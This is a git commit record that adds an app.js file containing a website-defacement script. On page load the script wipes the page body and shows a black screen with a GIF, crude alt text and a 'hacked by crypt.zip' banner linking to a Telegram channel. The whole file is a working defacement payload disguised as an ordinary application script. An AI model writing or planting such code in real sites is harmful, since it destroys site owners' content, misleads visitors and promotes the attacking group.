d5973591580194c33bf4d2eef19297605dc79110
yagizcrypt <139204989+yagizcrypt@users.noreply.github.com>
2025-05-18 04:17:54 +0300

    Add files via upload

---
+++ app.js
@@ -0,0 +1,16 @@
+window.onload = function () {
+    document.body.innerHTML = `
+    <div>
+        <div>
+            <center><img src="https://gifdb.com/images/high/alucard-498-x-278-gif-oyja2gcmfmyiubsy.gif" alt="crypt.zip sikti"></center>
+        </div>
+
+        <div>
+            <br>
+            <br>
+
+            <center><strong><a href="https://www.t.me/cryptzip1337" target="_blank" rel="noopener noreferrer" style="color: white; text-decoration: none; text-transform: uppercase;">hacked by crypt.zip</a></strong></center>
+        </div>
+    </div>`;
+    document.body.style = "background-color: black; color: white;";
+};
